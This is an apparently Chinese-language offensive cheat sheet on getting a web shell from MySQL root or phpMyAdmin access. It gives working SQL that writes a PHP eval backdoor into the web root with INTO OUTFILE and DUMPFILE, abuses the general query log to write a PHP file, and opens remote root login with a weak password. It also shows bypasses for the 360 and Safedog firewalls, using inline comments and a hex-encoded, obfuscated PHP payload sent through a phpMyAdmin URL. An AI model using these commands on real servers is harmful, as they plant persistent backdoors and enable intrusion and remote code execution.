# sql_shell

---

**使用背景**

- 一般在获得phpmyadmin等root权限

**教程**：https://blog.csdn.net/q1352483315/article/details/88904001

**导文件**

- 前提

  ```
  root权限
  写入权限
  查看能否自定义导出文件目录的权限
  	show global variables like "%secure%";      //查询secure_file_priv配置
  	secure_file_prive=null              //不允许导入导出数据到目录
  	secure_file_priv=c:\90sec            //允许导入导出数据到指定目录
  	secure_file_priv=''              //允许导入导出数据到任意目录
  	secure_file_priv="/"              //允许导入导出数据到任意目录
  注：在my.ini、my.cnf、mysqld.cnf文件中找到secure_file_prive并将其值设置为""或"/"，重启MySQL服务！
  ```

-  写5he11

  ```
  1.规导入5he11的操作
    创建数据表导出5he11
    CREATE TABLE `mysql`.`shadow9` (`content` TEXT NOT NULL );
    INSERT INTO `mysql`.`shadow9` (`content` ) VALUES ('<?php @eval($_POST[pass]);?>');
    SELECT `content` FROM `shadow9` INTO OUTFILE 'C:\\phpStudy\\WWW\\90sec.php';
    DROP TABLE IF EXISTS `shadow9`;
  
  2.一句话导出5he11：
    select '<?php @eval($_POST[pass]);?>' into outfile 'c:/phpstudy/www/90sec.php';  
    select '<?php @eval($_POST[pass]);?>' into outfile 'c:\\phpstudy\\www\\90sec.php';
    select '<?php @eval($_POST[pass]);?>' into dumpfile 'c:\\phpstudy\\www\\bypass.php';
  ```

**导日志**

- 前提

	```
  root权限
  有写入权限
  ```
  
- 写5he11

	```
    日志备份获取shell
    show global variables like "%genera%";          //查询general_log配置
    set global general_log='on';              //开启general log模式
    SET global general_log_file='D:/phpStudy/WWW/cmd.php';    //设置日志文件保存路径
    SELECT '<?php phpinfo();?>';              //phpinfo()写入日志文件
    set global general_log='off';              //关闭general_log模式
	```

**bypass waf**

- 写5he11

  ```
  当有WAF拦截的时候 我们可以尝试外链 这样提交的数据包不被WAF拦截
  grant all privileges on *.* to 'root'@'%' identified by 'root' with grant option;     //开启MySQL外链
  flush privileges;                      //刷新MySQL系统权限相关表
  
  绕过360 （通过内联注释）
  select '<?php @eval($_POST[pass]);?>' into /*!50001outfile*/ 'c:/phpstudy/www/bypass.php';
  
  绕过网站安全狗<4.0 （通过hex编码）
  select 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile 'C:\\phpStudy\\WWW\\bypass.php';
  
  绕过安全狗4.0 通过hex编码+内联注释
  /*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile 'C:\\phpStudy\\WWW\\bypass.php';
  
  绕过server_sql.php、tbl_sql.php、db_sql.php + 安全狗导出WebShell
  以上的三个文件的作用是（执行SQL语句）
  但是如果被删除了可以通过以下的方法
  (1)token需要
  (2)自己选择一个数据库和数据表
  (3)参数pos=0
  &sql_query=/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile 'C:\\phpStudy\\WWW\\bypass.php';
  
  例如 http://127.0.0.1/phpmyadmin/sql.php?db=数据库名&token=token值&table=数据表名&pos=0&sql_query=/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile 'C:\\phpStudy\\WWW\\bypass.php';
  ```

  